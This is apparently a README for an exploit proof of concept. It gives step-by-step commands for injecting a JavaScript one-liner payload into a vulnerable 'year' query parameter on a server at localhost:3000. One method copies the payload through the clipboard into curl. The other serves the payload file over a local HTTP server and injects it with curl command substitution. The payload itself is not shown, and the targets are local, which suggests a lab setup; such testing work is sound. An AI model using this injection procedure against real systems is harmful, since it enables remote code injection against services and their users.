# How to use the payload

## Method 1
Copy the contents of the payload file.
```
# Windows
type payload\oneliner.js | clip

# Linux
xclip -in payload/oneliner.js -selection clipboard
```

And paste it at the vulnerable endpoint.

```
curl -G --data-urlencode "year=<payload>" http://localhost:3000
```

## Method 2
Host a server from the `payload` directory and use cURL to inject the payload
1. `php -S 0.0.0.0:5000` or `python -m http.server 5000`
2. `curl -G --data-urlencode "year=$(curl -s http://localhost:5000/oneliner.js)" http://localhost:3000`
